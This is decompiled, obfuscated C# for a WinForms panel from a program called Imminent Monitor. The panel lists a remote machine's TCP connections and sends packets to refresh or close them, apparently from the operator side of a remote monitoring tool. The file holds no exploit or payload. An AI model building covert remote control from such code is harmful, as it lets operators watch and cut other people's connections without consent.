// Decompiled with JetBrains decompiler
// Type: UserControlTCPConnections
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlTCPConnections : UserControl
{
  private IContainer icontainer_0;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ColumnHeader columnHeader_2;
  private ColumnHeader columnHeader_3;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ImageList imageList_0;
  private GClass18 gclass18_0;
  private ListViewGroup listViewGroup_0;
  private ListViewGroup listViewGroup_1;
  private ListViewGroup listViewGroup_2;
  private ListViewGroup listViewGroup_3;
  private ListViewGroup listViewGroup_4;
  private ListViewGroup listViewGroup_5;
  private bool bool_0;

  public UserControlTCPConnections()
  {
    this.Load += new EventHandler(this.UserControlTCPConnections_Load);
    this.listViewGroup_0 = new ListViewGroup()
    {
      Header = "Listening"
    };
    this.listViewGroup_1 = new ListViewGroup()
    {
      Header = "Established"
    };
    this.listViewGroup_2 = new ListViewGroup()
    {
      Header = "Closed"
    };
    this.listViewGroup_3 = new ListViewGroup()
    {
      Header = "Close Wait"
    };
    this.listViewGroup_4 = new ListViewGroup()
    {
      Header = "TIME_WAIT"
    };
    this.listViewGroup_5 = new ListViewGroup()
    {
      Header = "Uncategorised"
    };
    this.bool_0 = true;
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    this.vmethod_1(new GClass41());
    this.vmethod_3(new ColumnHeader());
    this.vmethod_5(new ColumnHeader());
    this.vmethod_7(new ColumnHeader());
    this.vmethod_9(new ColumnHeader());
    this.vmethod_11(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_15(new ImageList(this.icontainer_0));
    this.vmethod_10().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Columns.AddRange(new ColumnHeader[4]
    {
      this.vmethod_2(),
      this.vmethod_4(),
      this.vmethod_6(),
      this.vmethod_8()
    });
    this.vmethod_0().ContextMenuStrip = this.vmethod_10();
    this.vmethod_0().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_0().FullRowSelect = true;
    this.vmethod_0().HideSelection = false;
    this.vmethod_0().Location = new Point(3, 3);
    this.vmethod_0().Name = "ListViewTCPConnections";
    GClass41 gclass41 = this.vmethod_0();
    Size size1 = new Size(731, 477);
    Size size2 = size1;
    gclass41.Size = size2;
    this.vmethod_0().SmallImageList = this.vmethod_14();
    this.vmethod_0().TabIndex = 13;
    this.vmethod_0().UseCompatibleStateImageBehavior = false;
    this.vmethod_0().View = View.Details;
    this.vmethod_2().Text = "Process Name";
    this.vmethod_2().TextAlign = HorizontalAlignment.Center;
    this.vmethod_2().Width = 287;
    this.vmethod_4().Text = "Remote Address";
    this.vmethod_4().TextAlign = HorizontalAlignment.Center;
    this.vmethod_4().Width = 145;
    this.vmethod_6().Text = "Remote Port";
    this.vmethod_6().TextAlign = HorizontalAlignment.Center;
    this.vmethod_6().Width = 113;
    this.vmethod_8().Text = "State";
    this.vmethod_8().TextAlign = HorizontalAlignment.Center;
    this.vmethod_8().Width = 126;
    this.vmethod_10().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_10().Items.AddRange(new ToolStripItem[1]
    {
      (ToolStripItem) this.vmethod_12()
    });
    this.vmethod_10().Name = "ContextMenuStripTCP";
    ContextMenuStrip contextMenuStrip = this.vmethod_10();
    size1 = new Size(119, 26);
    Size size3 = size1;
    contextMenuStrip.Size = size3;
    this.vmethod_12().Image = (Image) Class145.smethod_9();
    this.vmethod_12().Name = "RefreshToolStripMenuItem2";
    ToolStripMenuItem toolStripMenuItem = this.vmethod_12();
    size1 = new Size(118, 22);
    Size size4 = size1;
    toolStripMenuItem.Size = size4;
    this.vmethod_12().Tag = (object) "0";
    this.vmethod_12().Text = "Refresh";
    this.vmethod_14().ColorDepth = ColorDepth.Depth32Bit;
    ImageList imageList = this.vmethod_14();
    size1 = new Size(24, 24);
    Size size5 = size1;
    imageList.ImageSize = size5;
    this.vmethod_14().TransparentColor = Color.Transparent;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlTCPConnections);
    size1 = new Size(736, 483);
    this.Size = size1;
    this.vmethod_10().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GClass41 vmethod_0() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GClass41 gclass41_1) => this.gclass41_0 = gclass41_1;

  internal virtual ColumnHeader vmethod_2() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ColumnHeader columnHeader_4) => this.columnHeader_0 = columnHeader_4;

  internal virtual ColumnHeader vmethod_4() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ColumnHeader columnHeader_4) => this.columnHeader_1 = columnHeader_4;

  internal virtual ColumnHeader vmethod_6() => this.columnHeader_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ColumnHeader columnHeader_4) => this.columnHeader_2 = columnHeader_4;

  internal virtual ColumnHeader vmethod_8() => this.columnHeader_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ColumnHeader columnHeader_4) => this.columnHeader_3 = columnHeader_4;

  internal virtual ContextMenuStrip vmethod_10() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_1;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ImageList vmethod_14() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ImageList imageList_1) => this.imageList_0 = imageList_1;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  public void method_2()
  {
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.TcpConnections,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TcpConnectionPacket.Refresh
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  private void method_3(string string_0, string string_1, string string_2, string string_3)
  {
    object[] object_0 = new object[6]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.TcpConnections,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TcpConnectionPacket.Close,
      (object) string_0,
      (object) string_1,
      (object) string_2,
      (object) string_3
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_4(object[] object_0)
  {
    if (this.InvokeRequired)
    {
      this.Invoke((Delegate) new Class97.Delegate10(this.method_4), (object) object_0);
    }
    else
    {
      if (this.bool_0)
      {
        this.bool_0 = false;
        this.vmethod_14().Images.Add((Image) Class97.smethod_17((Bitmap) this.method_0().method_20().newFormSystemManagers_0.vmethod_30().Image.Clone()));
      }
      this.vmethod_0().Items.Clear();
      this.vmethod_0().Groups.Clear();
      this.vmethod_0().Groups.Add(this.listViewGroup_1);
      this.vmethod_0().Groups.Add(this.listViewGroup_0);
      this.vmethod_0().Groups.Add(this.listViewGroup_2);
      this.vmethod_0().Groups.Add(this.listViewGroup_3);
      this.vmethod_0().Groups.Add(this.listViewGroup_4);
      this.vmethod_0().Groups.Add(this.listViewGroup_5);
      int num = object_0.Length - 1;
      for (int index = 2; index <= num; index += 7)
      {
        ListViewItem listViewItem_0 = new ListViewItem();
        listViewItem_0.ImageIndex = 0;
        string str1 = (string) object_0[index];
        string text1 = (string) object_0[index + 1];
        string text2 = (string) object_0[index + 2];
        string str2 = (string) object_0[index + 4];
        listViewItem_0.Text = str1;
        listViewItem_0.SubItems.Add(text1);
        listViewItem_0.SubItems.Add(text2);
        listViewItem_0.SubItems.Add(str2);
        this.method_6(str2, ref listViewItem_0);
        this.vmethod_0().Items.Add(listViewItem_0);
      }
    }
  }

  private void method_5(object sender, EventArgs e) => this.method_2();

  private void method_6(string string_0, ref ListViewItem listViewItem_0)
  {
    string Left = string_0;
    if (Operators.CompareString(Left, "Listening", false) == 0)
    {
      listViewItem_0.ForeColor = Color.Blue;
      listViewItem_0.Group = this.listViewGroup_0;
    }
    else if (Operators.CompareString(Left, "Established", false) == 0)
    {
      listViewItem_0.ForeColor = Color.Green;
      listViewItem_0.Group = this.listViewGroup_1;
    }
    else if (Operators.CompareString(Left, "Closed", false) == 0)
    {
      listViewItem_0.ForeColor = Color.Red;
      listViewItem_0.Group = this.listViewGroup_2;
    }
    else if (Operators.CompareString(Left, "Close Wait", false) == 0)
    {
      listViewItem_0.ForeColor = Color.OrangeRed;
      listViewItem_0.Group = this.listViewGroup_3;
    }
    else if (Operators.CompareString(Left, "TIME_WAIT", false) == 0)
    {
      listViewItem_0.ForeColor = Color.Orange;
      listViewItem_0.Group = this.listViewGroup_4;
    }
    else
      listViewItem_0.Group = this.listViewGroup_5;
  }

  private void UserControlTCPConnections_Load(object sender, EventArgs e) => Class97.smethod_15(this.vmethod_10());
}
